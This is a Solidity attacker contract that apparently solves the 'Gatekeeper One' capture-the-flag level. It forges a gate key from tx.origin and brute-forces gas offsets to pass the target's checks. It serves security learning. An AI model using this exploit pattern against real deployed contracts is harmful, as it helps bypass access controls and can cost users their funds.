// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {
    IGatekeeperOne public instance;

    constructor(address _instance) public {
        instance = IGatekeeperOne(_instance);
    }

    function attack() public payable {
        bytes8 gateKey = bytes8(uint64(uint32(uint16(tx.origin)))) | 0x1000000000000000;

        for (uint256 i = 0; i < 8191; i++) {
            try instance.enter{ gas: 81910 + i }(gateKey) {
                break;
            } catch {}
        }
    }
}
